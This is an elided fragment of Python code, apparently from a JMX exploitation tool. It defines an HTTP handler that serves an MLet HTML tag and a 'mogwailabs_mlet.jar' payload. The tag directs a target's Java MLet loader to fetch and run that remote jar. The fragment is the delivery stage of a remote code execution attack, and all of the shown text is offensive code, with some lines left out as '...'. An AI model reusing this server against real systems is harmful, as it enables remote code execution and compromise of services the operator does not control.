...
def MakeHandlerClass(base_url):
    ...
    class CustomHandler(BaseHTTPRequestHandler):
        ...
        def do_GET(self):
            if self.path=="/":
                mlet_code = '<html><mlet code="de.mogwailabs.mlet.MogwaiLabsPayload" archive="' + self.jar_name + '" name="MogwaiLabs:name=payload,id=1" codebase="' + self._base_url + '"></mlet></html>'
                ...
                f = open("./payloads/mogwailabs_mlet.jar")
                self.send_response(200)
